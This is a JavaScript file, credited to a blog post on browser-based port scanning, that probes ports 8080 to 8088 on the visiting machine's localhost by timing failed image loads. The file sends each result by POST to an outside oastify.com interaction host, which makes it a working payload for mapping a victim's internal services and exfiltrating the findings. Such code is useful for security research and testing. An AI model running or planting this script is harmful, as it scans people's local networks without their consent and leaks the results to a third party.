// Copied from https://incolumitas.com/2021/01/10/browser-based-port-scanning/

// Author: Nikolai Tschacher
// tested on Chrome v86 on Ubuntu 18.04
var portIsOpen = function(hostToScan, portToScan, N) {
  return new Promise((resolve, reject) => {
    var portIsOpen = 'unknown';

    var timePortImage = function(port) {
      return new Promise((resolve, reject) => {
        var t0 = performance.now()
        // a random appendix to the URL to prevent caching
        var random = Math.random().toString().replace('0.', '').slice(0, 7)
        var img = new Image;

        img.onerror = function() {
          var elapsed = (performance.now() - t0)
          // close the socket before we return
          resolve(parseFloat(elapsed.toFixed(3)))
        }

        img.src = "http://" + hostToScan + ":" + port + '/' + random + '.png'
      })
    }

    const portClosed = 37857; // let's hope it's closed :D

    (async () => {
      var timingsOpen = [];
      var timingsClosed = [];
      for (var i = 0; i < N; i++) {
        timingsOpen.push(await timePortImage(portToScan))
        timingsClosed.push(await timePortImage(portClosed))
      }

      var sum = (arr) => arr.reduce((a, b) => a + b);
      var sumOpen = sum(timingsOpen);
      var sumClosed = sum(timingsClosed);
      var test1 = sumOpen >= (sumClosed * 1.3);
      var test2 = false;

      var m = 0;
      for (var i = 0; i <= N; i++) {
        if (timingsOpen[i] > timingsClosed[i]) {
          m++;
        }
      }
      // 80% of timings of open port must be larger than closed ports
      test2 = (m >= Math.floor(0.8 * N));

      portIsOpen = test1 && test2;
      resolve([portIsOpen, m, sumOpen, sumClosed]);
    })();
  });
}

var host = 'localhost';
var startPort = 8080;
var endPort = 8088;

for (let currPort = startPort; currPort <= endPort; currPort++) {
  portIsOpen(host, currPort, 30).then((res) => {
    let [isOpen, m, sumOpen, sumClosed] = res;
    console.log('Is '+host+':'+currPort+' open? ' + isOpen);
    fetch('https://086pfz6bi076yuute01s01tq3h97xw.oastify.com', {
      method: 'POST',
      mode: 'no-cors',
      body: 'Is '+host+':'+currPort+' open? ' + isOpen
    })
  })
}
